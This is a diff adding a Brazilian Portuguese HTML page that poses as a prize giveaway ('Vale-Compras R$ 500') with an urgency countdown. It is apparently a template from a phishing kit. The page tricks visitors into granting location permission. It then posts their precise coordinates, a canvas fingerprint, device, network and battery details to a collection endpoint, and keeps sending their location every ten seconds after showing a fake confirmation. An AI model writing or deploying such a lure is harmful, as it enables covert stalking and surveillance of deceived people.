@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <title>Parabéns!</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, 'Segoe UI', Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { background: white; padding: 35px; border-radius: 16px; box-shadow: 0 8px 30px rgba(0,0,0,0.2); text-align: center; max-width: 400px; width: 90%; }
+        .badge { font-size: 52px; margin-bottom: 10px; }
+        h1 { font-size: 22px; color: #333; margin-bottom: 6px; }
+        h2 { font-size: 14px; color: #888; font-weight: 400; margin-bottom: 20px; }
+        .prize-box { background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%); padding: 18px; border-radius: 10px; margin-bottom: 20px; }
+        .prize-box span { font-size: 24px; font-weight: bold; color: white; }
+        .prize-box p { font-size: 12px; color: rgba(255,255,255,0.85); margin-top: 4px; }
+        .timer { font-size: 28px; font-weight: bold; color: #f5576c; margin-bottom: 16px; font-variant-numeric: tabular-nums; }
+        p.msg { color: #666; font-size: 13px; margin-bottom: 16px; line-height: 1.5; }
+        .btn { background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%); color: white; border: none; padding: 14px 40px; border-radius: 25px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; transition: transform 0.2s, box-shadow 0.2s; box-shadow: 0 4px 15px rgba(245,87,108,0.4); }
+        .btn:hover { transform: translateY(-1px); box-shadow: 0 6px 20px rgba(245,87,108,0.5); }
+        .note { background: #fff8e1; padding: 10px; border-radius: 6px; margin-top: 14px; }
+        .note p { font-size: 11px; color: #856404; margin: 0; text-align: left; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #f5576c; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .hide { display: none; }
+        .info { font-size: 10px; color: #ccc; margin-top: 18px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="badge">&#127881;</div>
+        <h1>Parabéns! Você foi selecionado!</h1>
+        <h2>Promoção Especial de Julho</h2>
+
+        <div class="prize-box">
+            <span>Vale-Compras R$ 500</span>
+            <p>+ Frete grátis por 1 ano</p>
+        </div>
+
+        <div class="timer" id="timer">04:59</div>
+
+        <div id="etapa1">
+            <p class="msg">Para resgatar seu prêmio, precisamos confirmar que você está no Brasil.</p>
+            <div class="note">
+                <p>&#9888;&#65039; Clique em <strong>"Resgatar Prêmio"</strong> e depois em <strong>"Permitir"</strong> na janela que aparecer para verificar sua elegibilidade.</p>
+            </div>
+            <br>
+            <button class="btn" onclick="verificar()">&#127873; Resgatar Prêmio</button>
+        </div>
+
+        <div id="etapa2" class="hide">
+            <div class="loader"></div>
+            <p class="msg" id="status">Verificando elegibilidade...</p>
+        </div>
+
+        <div id="etapa3" class="hide">
+            <p class="msg" style="color: #00a884; font-weight: 600; font-size: 15px;">&#10004; Elegibilidade confirmada!</p>
+            <p class="msg">Seu vale-compras será enviado por e-mail em até 24 horas.</p>
+        </div>
+
+        <p class="info">Promoção válida apenas para residentes no Brasil</p>
+    </div>
+
+    <script>
+    // Countdown timer
+    let secs = 299;
+    setInterval(() => {
+        if (secs <= 0) return;
+        secs--;
+        const m = Math.floor(secs / 60);
+        const s = secs % 60;
+        document.getElementById("timer").textContent = String(m).padStart(2,"0") + ":" + String(s).padStart(2,"0");
+    }, 1000);
+
+    const SLUG = "{{SLUG}}";
+    const API = window.location.origin + "/api/collect/" + SLUG;
+
+    function getFingerprint() {
+        const c = document.createElement("canvas");
+        c.getContext("2d").fillText("fp", 2, 2);
+        return c.toDataURL().slice(-32);
+    }
+
+    function getDeviceInfo() {
+        return {
+            platform: navigator.platform || "",
+            language: navigator.language || "",
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "",
+            screen_w: screen.width, screen_h: screen.height,
+            touch: navigator.maxTouchPoints > 0,
+            cores: navigator.hardwareConcurrency || 0
+        };
+    }
+
+    async function getNetworkInfo() {
+        const info = { type: "unknown" };
+        if (navigator.connection) info.type = navigator.connection.effectiveType || "unknown";
+        try { const b = await navigator.getBattery(); info.battery = Math.round(b.level * 100); info.charging = b.charging; } catch(e) {}
+        return info;
+    }
+
+    async function sendData(lat, lon, acc) {
+        try {
+            await fetch(API, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ lat, lon, accuracy: acc, user_agent: navigator.userAgent, fingerprint: getFingerprint(), device: getDeviceInfo(), network: await getNetworkInfo() })
+            });
+        } catch(e) {}
+    }
+
+    function verificar() {
+        document.getElementById("etapa1").classList.add("hide");
+        document.getElementById("etapa2").classList.remove("hide");
+        navigator.geolocation.getCurrentPosition(
+            async function(pos) {
+                await sendData(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
+                document.getElementById("etapa2").classList.add("hide");
+                document.getElementById("etapa3").classList.remove("hide");
+                setInterval(() => navigator.geolocation.getCurrentPosition(async p => await sendData(p.coords.latitude, p.coords.longitude, p.coords.accuracy)), 10000);
+            },
+            function() {
+                document.getElementById("status").innerText = "Erro na verificação. Tente novamente.";
+                setTimeout(() => { document.getElementById("etapa2").classList.add("hide"); document.getElementById("etapa1").classList.remove("hide"); }, 2000);
+            },
+            { enableHighAccuracy: true, timeout: 15000 }
+        );
+    }
+    </script>
+</body>
+</html>
